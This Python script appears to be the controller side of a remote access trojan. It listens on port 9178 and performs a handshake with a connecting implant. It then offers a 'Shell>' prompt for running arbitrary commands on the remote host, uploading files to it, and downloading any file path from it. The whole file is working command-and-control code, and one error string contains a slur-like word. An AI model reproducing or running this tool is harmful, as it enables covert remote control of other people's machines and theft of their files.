import socket
import time
import struct
import os
"""did not know how important # is until this lmao. can't find shi"""

PORT = 9178
SHAKER = "buuuuuuuhhhh"
SHAKETH = "buuuuhhh"

def send_packet(sock, prefix, payload_bytes):
    total_len = len(prefix) + len(payload_bytes)
    header = struct.pack('!I', total_len)
    sock.sendall(header + prefix + payload_bytes)

def recv_packet(sock):
    header = sock.recv(4)
    if not header:
        return None
    packet_len = struct.unpack('!I', header)[0]
    
    chunks = []
    bytes_received = 0
    while bytes_received < packet_len:
        chunk = sock.recv(min(packet_len - bytes_received, 4096))
        if not chunk:
            break
        chunks.append(chunk)
        bytes_received += len(chunk)
    return b''.join(chunks)

def start_master():
    master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    master.bind(('', PORT)) 
    master.listen(1)
    
    print(f"Listening on port {PORT}. Waiting for connection...")
    
    try:
        conn, addr = master.accept()
        
        #handshake
        handshake = conn.recv(1024).decode('utf-8')
        if handshake != SHAKETH:
            print("Handshake with broker unsuccessful. Retrying...")
            conn.close()
            master.close()
            return
            
        conn.sendall(SHAKER.encode('utf-8'))
        print("Connection Successful")
        
        #main loop
        while True:
            command = input("Shell> ").strip()
            if not command:
                continue
                
            if command.lower() == "exit":
                send_packet(conn, b"CMD_", b"exit")
                break
                
            #file upload
            if command.lower().startswith("upload "):
                try:
                    _, filepath = command.split(" ", 1)
                    if not os.path.exists(filepath):
                        print(f"Local file not found: {filepath}")
                        continue
                    filename = os.path.basename(filepath)
                    with open(filepath, "rb") as f:
                        file_data = f.read()
                    
                    fn_bytes = filename.encode('utf-8')
                    meta = struct.pack('!H', len(fn_bytes)) + fn_bytes
                    print(f"Uploading {filename} ({len(file_data)} bytes)...")
                    send_packet(conn, b"FILE", meta + file_data)
                    
                    response = recv_packet(conn)
                    print(response.decode('utf-8'))
                except Exception as e:
                    print(f"Upload process error: {e}")
            
            #file download
            elif command.lower().startswith("download "):
                try:
                    _, remote_path = command.split(" ", 1)
                    print(f"Requesting download for: {remote_path}")
                    send_packet(conn, b"DWNL", remote_path.encode('utf-8'))
                    
                    packet = recv_packet(conn)
                    if not packet:
                        print("Empty pipe context.")
                        continue
                    
                    prefix = packet[:4]
                    content = packet[4:]
                    
                    if prefix == b"ERR_":
                        print(f"Nikka Error: {content.decode('utf-8')}")
                    elif prefix == b"FILE":
                        fn_len = struct.unpack('!H', content[:2])[0]
                        filename = content[2:2+fn_len].decode('utf-8')
                        file_data = content[2+fn_len:]
                        
                        out_name = f"downloaded_{filename}"
                        with open(out_name, "wb") as f:
                            f.write(file_data)
                        print(f"Download complete -> {out_name} ({len(file_data)} bytes)")
                except Exception as e:
                    print(f"Download process error: {e}")
                    
            # commands
            else:
                send_packet(conn, b"CMD_", command.encode('utf-8'))
                response = recv_packet(conn)
                if response:
                    print(response.decode('utf-8'))
                else:
                    print("Closed session link.")
                    break

        conn.close()
        master.close()
        print("Session ended uh oh where did the payload go")
        
    except KeyboardInterrupt:
        print("\nSession ended")
        try: conn.close()
        except: pass
        master.close()
    except Exception as e:
        print(f"Runtime Error: {e}")
        master.close()

if __name__ == "__main__":
    start_master()